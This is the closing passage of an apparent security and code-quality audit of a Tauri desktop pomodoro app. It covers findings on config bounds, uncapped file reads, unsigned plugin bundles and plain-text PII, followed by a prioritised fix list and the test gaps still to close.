A malicious person with local write access to `~/.flint/config.toml` could set `pomodoro.focus_min = 4294967295` (u32::MAX) → `u64::from(...)*60` → huge target that overflows or renders nonsensically. Low actual risk (local access = game over), but bounds would be prudent.

**S-M3. `plugin_storage_get` reads whole file into memory with no size cap.**
`src-tauri/src/commands.rs:521-528`. A plugin (or a pre-existing on-disk file) that's, say, 2 GB will cause an allocation failure and panic the Tauri backend. Gate with `File::metadata().len() < MAX`.

### LOW

**S-L1. Recovery file read has no size cap either.**
`src-tauri/src/storage.rs:106-114`. Same class as S-M3, lower likelihood.

**S-L2. No signing or integrity check on community plugin bundles.**
PRD 14 lists a marketplace as "future consideration" — noting for the record.

**S-L3. `recovery.json` may contain PII (tags, session IDs) and is written in plain text.**
Expected for local-first, noted for completeness.

---

## Quick triage summary

**Must-fix before v1 release:**
- B-C1 (recovery clock), B-C2 / S-C1 (plugin sandbox), B-C3 / S-C2 (CSP), B-H2 (tray quit leaks session), D-H1 (overlay shadow), D-H2 (range input styling), D-H3 (misplaced shadows).

**Should-fix this phase:**
- B-H1 (keyboard effect re-registration), B-H4 (silent config reset), B-H5 (listener races), D-H4 (draggable sidebar), P-H2 (timer state split), Q-M5 (no lint script), missing PRD items (Tab/arrow nav, keybinding rebinder, Open data folder, Export).

**Nice-to-have:**
- All MEDIUM/LOW findings under Design, Performance, Code Quality.

**Test gaps worth closing now:**
- `build_initial_state` recovery-with-pauses (would catch B-C1)
- `tick_once` interval overrun (B-M4)
- `finalize_session` with a failing write (B-H3)
- Round-trip for `config.toml` with malformed input (B-H4)
- Plugin sandbox escape test: verify a plugin cannot reach `window.__TAURI_INTERNALS__` (S-C1)

---

*End of audit.*
